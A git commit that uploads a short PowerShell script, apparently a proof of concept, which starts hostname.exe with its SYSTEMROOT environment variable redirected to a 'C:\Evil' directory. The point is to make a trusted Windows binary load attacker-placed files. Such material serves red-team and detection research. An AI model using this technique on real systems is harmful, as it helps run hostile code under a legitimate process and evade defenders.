205c07506b6194dd5fea549dbee3c11551a9c710
Mason Brott <47792629+MasonBrott@users.noreply.github.com>
2023-04-09 22:27:12 -0500

    Add files via upload

---
+++ Change-Environment.ps1
@@ -0,0 +1,8 @@
+﻿$s = New-Object System.Diagnostics.ProcessStartInfo
+$s.FileName="C:\windows\system32\hostname.exe"
+$s.EnvironmentVariables.Remove("SYSTEMROOT")
+$s.EnvironmentVariables.Add("SYSTEMROOT", "C:\Evil")
+$s.UseShellExecute = $false
+$p = New-Object System.Diagnostics.Process
+$p.StartInfo = $s
+$p.Start()
